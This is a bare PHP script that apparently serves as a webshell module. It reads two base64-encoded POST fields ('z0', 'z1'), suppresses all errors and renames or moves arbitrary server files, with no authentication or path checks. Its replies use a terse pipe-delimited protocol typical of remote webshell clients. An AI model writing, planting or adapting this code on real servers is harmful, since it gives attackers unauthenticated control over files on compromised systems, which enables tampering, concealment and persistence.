<?php

error_reporting(0);

$src_path = base64_decode($_POST['z0']);
$dst_path = base64_decode($_POST['z1']);

if (!file_exists($dst_path)) {
    if (rename($src_path, $dst_path)) {
        echo('1|');
    } else {
        echo('0|Error.');
    }
} else {
    echo('0|Destination already exists.');
}

?>